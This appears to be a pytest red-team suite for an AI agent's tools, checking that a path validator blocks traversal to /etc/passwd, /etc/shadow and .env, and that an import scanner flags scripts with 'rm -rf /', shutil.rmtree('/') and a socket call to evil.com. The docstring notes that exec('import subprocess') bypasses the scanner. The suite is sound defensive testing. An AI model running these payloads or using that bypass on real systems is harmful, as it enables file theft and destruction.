"""Red-team test suite: Prompt Injection and Tool Misuse attack simulation.

These tests prove that the Gatekeeper/Watchdog layer in our tools safely blocks
two classes of attack:

  1. Prompt Injection — attacker-controlled strings in tool parameters that
     attempt path traversal, null-byte injection, or shell metacharacter abuse
     against the markdown_converter_tool path validator.

  2. Tool Misuse — attempts to exploit the python_runner_tool by injecting
     scripts that import forbidden OS-level modules (subprocess, sys, socket)
     to achieve command execution or data exfiltration.

Each test contains:
  - ATTACK: the adversarial input.
  - DEFENCE: the mechanism that blocks it (module + method).
  - ASSERTION: proof the attack is defeated.

Known limitation (documented, not fixed here):
  `exec("import subprocess")` bypasses the static AST scanner because the
  import is inside a string argument to `exec`, not a bare `ast.Import` node.
  The tool's defence is static analysis only; a full sandbox (seccomp, etc.)
  would be needed to cover dynamic eval attacks.
"""

import pytest

from src.config import settings
from src.tools.markdown_converter import markdown_converter_tool
from src.tools.python_runner import python_runner_tool

# ═══════════════════════════════════════════════════════════════════════════════
# CLASS 1: Prompt Injection — path traversal and injection into file paths
# ═══════════════════════════════════════════════════════════════════════════════


class TestPromptInjectionBlocked:
    """Attacker injects malicious strings into the md_path / tex_path parameters
    of markdown_converter_tool to read or overwrite files outside OUTPUT_DIR.
    Defence: MarkdownConverterTool._validate_path() — raises ValueError.
    """

    # ATTACK: classic dot-dot traversal to reach /etc/passwd
    def test_dot_dot_traversal_to_etc_passwd_blocked(self):
        with pytest.raises(ValueError, match="escapes"):
            markdown_converter_tool._validate_path("../../etc/passwd")

    # ATTACK: single parent hop to read the .env secrets file
    def test_single_parent_hop_to_env_blocked(self):
        with pytest.raises(ValueError, match="escapes"):
            markdown_converter_tool._validate_path("../secrets/.env")

    # ATTACK: absolute path injection (replaces relative base entirely)
    def test_absolute_path_injection_to_shadow_blocked(self):
        with pytest.raises(ValueError, match="escapes"):
            markdown_converter_tool._validate_path("/etc/shadow")

    # ATTACK: deep traversal via many parent hops
    def test_deep_traversal_six_hops_blocked(self):
        with pytest.raises(ValueError, match="escapes"):
            markdown_converter_tool._validate_path("a/b/../../../../../../../etc/hosts")

    # ATTACK: URL-style double-slash prefix masking path
    def test_double_slash_absolute_path_blocked(self):
        with pytest.raises(ValueError, match="escapes"):
            markdown_converter_tool._validate_path("//etc/passwd")

    # ATTACK: null byte to terminate path string in C-level syscall
    def test_null_byte_injection_in_path_blocked(self):
        with pytest.raises((ValueError, TypeError)):
            markdown_converter_tool._validate_path("innocent\x00../../etc/passwd")

    # CONTROL: a legitimate path within OUTPUT_DIR is accepted
    def test_valid_path_within_output_dir_is_accepted(self, monkeypatch, tmp_path):
        monkeypatch.setattr(settings, "OUTPUT_DIR", str(tmp_path))
        result = markdown_converter_tool._validate_path("chapters/ch1.md")
        assert result.is_relative_to(tmp_path)


# ═══════════════════════════════════════════════════════════════════════════════
# CLASS 2: Tool Misuse — forbidden module injection via python_runner_tool
# ═══════════════════════════════════════════════════════════════════════════════


class TestToolMisuseBlocked:
    """Attacker passes a Python script containing imports of forbidden modules
    to python_runner_tool to achieve command execution or network access.
    Defence: PythonRunnerTool._scan_imports() — returns list of blocked names;
             PythonRunnerTool._run() raises ValueError on any blocked import.
    """

    # ATTACK: import subprocess to execute arbitrary shell commands
    def test_subprocess_import_flagged_by_scanner(self):
        script = "import subprocess; subprocess.run(['rm', '-rf', '/'])"
        bad = python_runner_tool._scan_imports(script)
        assert "subprocess" in bad

    # ATTACK: import sys to inspect interpreter internals or call sys.exit
    def test_sys_import_flagged_by_scanner(self):
        bad = python_runner_tool._scan_imports("import sys; sys.exit(0)")
        assert "sys" in bad

    # ATTACK: import socket for data exfiltration over TCP
    def test_socket_import_flagged_by_scanner(self):
        script = "import socket; socket.connect(('evil.com', 80))"
        bad = python_runner_tool._scan_imports(script)
        assert "socket" in bad

    # ATTACK: from-import form of subprocess (bypasses naive string matching)
    def test_from_import_subprocess_flagged_by_scanner(self):
        script = "from subprocess import run; run(['id'])"
        bad = python_runner_tool._scan_imports(script)
        assert "subprocess" in bad

    # ATTACK: from-import form of sys
    def test_from_import_sys_module_flagged_by_scanner(self):
        bad = python_runner_tool._scan_imports("from sys import argv")
        assert "sys" in bad

    # ATTACK: chained multi-module attack in one import statement
    def test_chained_forbidden_imports_all_flagged(self):
        script = "import socket, subprocess, sys, shutil, ctypes"
        bad = python_runner_tool._scan_imports(script)
        assert "subprocess" in bad
        assert "socket" in bad
        assert "sys" in bad

    # ATTACK: import shutil to delete or copy files across the filesystem
    def test_shutil_import_flagged_by_scanner(self):
        bad = python_runner_tool._scan_imports("import shutil; shutil.rmtree('/')")
        assert "shutil" in bad

    # ATTACK: script with forbidden import raises ValueError at _run level
    def test_forbidden_import_raises_valueerror_on_run(self):
        with pytest.raises(ValueError, match="disallowed"):
            python_runner_tool._run("import subprocess; subprocess.run(['ls'])")

    # ATTACK: nested package import (os.path is allowed, but ctypes.cdll is not)
    def test_ctypes_import_flagged_by_scanner(self):
        script = "import ctypes; ctypes.cdll.LoadLibrary('evil.so')"
        bad = python_runner_tool._scan_imports(script)
        assert "ctypes" in bad

    # CONTROL: the allowlisted imports (matplotlib, numpy, pathlib, os) pass clean
    def test_allowed_imports_produce_empty_scan_result(self):
        script = "import matplotlib\nimport numpy\nimport pathlib\nimport os"
        bad = python_runner_tool._scan_imports(script)
        assert bad == []

    # CONTROL: a script with no imports is clean
    def test_script_with_no_imports_is_clean(self):
        bad = python_runner_tool._scan_imports("x = 1 + 1\nprint(x)")
        assert bad == []
